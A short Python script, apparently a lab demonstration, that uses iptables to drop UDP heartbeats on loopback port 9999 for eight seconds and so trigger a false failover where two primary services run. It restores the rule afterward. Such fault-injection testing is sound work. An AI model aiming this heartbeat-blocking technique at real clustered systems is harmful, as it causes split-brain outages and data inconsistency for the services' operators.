import os
import subprocess
import time

PORT = 9999
DURATION = 8


def change_firewall(action):
    command = [
        "iptables",
        action,
        "INPUT",
        "-i", "lo",
        "-p", "udp",
        "--dport", str(PORT),
        "-j", "DROP"
    ]

    subprocess.run(command, check=True)


def run_attack():
    if os.geteuid() != 0:
        print("Run this script using sudo.")
        return

    print("Starting false failover attack.")
    print("Blocking UDP heartbeats to port", PORT)

    try:
        change_firewall("-I")
    except (FileNotFoundError, subprocess.CalledProcessError):
        print("Could not add firewall rule.")
        return

    try:
        print("Heartbeats blocked for", DURATION, "seconds.")
        time.sleep(DURATION)

    except KeyboardInterrupt:
        print("Attack interrupted.")

    finally:
        change_firewall("-D")
        print("Heartbeat communication restored.")

    print("Attack finished.")
    print("Check monitor logs for false failover.")
    print("Check whether two primary services are running.")


if __name__ == "__main__":
    run_attack()
